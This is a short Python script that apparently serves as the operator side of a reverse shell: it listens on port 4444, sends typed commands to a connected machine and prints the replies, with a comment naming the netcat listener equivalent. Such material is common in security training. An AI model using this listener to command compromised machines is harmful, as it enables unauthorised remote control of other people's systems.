#!usr/bin/env python3

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# this line will reuse socket if connection dropped
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("", 4444))
listener.listen(1)
print("[+] waiting for a connection")
connection, address = listener.accept()
print("[+] got a connection from " + str(address))

while True:
    command = input(">> ")
    connection.send(command.encode())
    result = connection.recv(1024)
    print(result)
# nc -vv -l -p 4444
